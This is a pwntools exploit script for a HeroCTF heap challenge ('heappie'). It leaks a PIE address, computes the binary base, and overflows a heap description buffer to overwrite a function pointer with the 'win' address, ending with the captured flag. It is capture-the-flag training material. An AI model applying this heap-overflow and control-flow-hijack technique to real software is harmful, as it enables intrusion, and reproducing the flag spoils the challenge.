#!/usr/bin/env python3

from pwn import *

elf = ELF("./heappie_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def start():
    if args.REMOTE:
        return remote("pwn.heroctf.fr", 6000)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

index = 0

#========= exploit here ===================
r.timeout = 0.5
def add_music(yn,title,artist, description):
    global index
    sl(b"1")
    sla(b"(y/n):", yn) #sound
    sla(b"title:", title)
    sla(b"artist:", artist)
    sla(b"description:", description)
    rcu(b">>")
    index += 1
    return index - 1

def play_music(idx):
    sl(b"2")
    sla(b"index:", str(idx).encode('ascii'))

def delete_music(idx):
    sl(b"3")
    sla(b"index:", str(idx).encode('ascii'))
    rcu(b">>")

a = add_music(b"y",b"XXXXXXXX",b"YYYYYYYY", (b"Z"))

#leak 1/3 bruteforce
sl(b"4")
leak = int(rcu(b"by YYYYYYYY (song: ", b")"),16)
rcu(b">>")
logleak("leak", leak)
#calculating the offset, mask = 0xfff (+0x1000)
value = (leak & 0xfff) + 0x1000
elf.address = leak - value
logleak("base address", elf.address)
#0x55a6913762e9

#reset 
delete_music(a)

#trigger win
a = add_music(b"y",b"XXXXXXXX",b"YYYYYYYY", (b"Z"*128)+p64(elf.sym.win))
b = add_music(b"n",b"AAAAAAAA",b"BBBBBBBB", b"CCCCCCCC")

#get the flag
play_music(1)

#========= interactive ====================
r.interactive()
#Hero{b4s1c_H3AP_0verfL0w!47280319}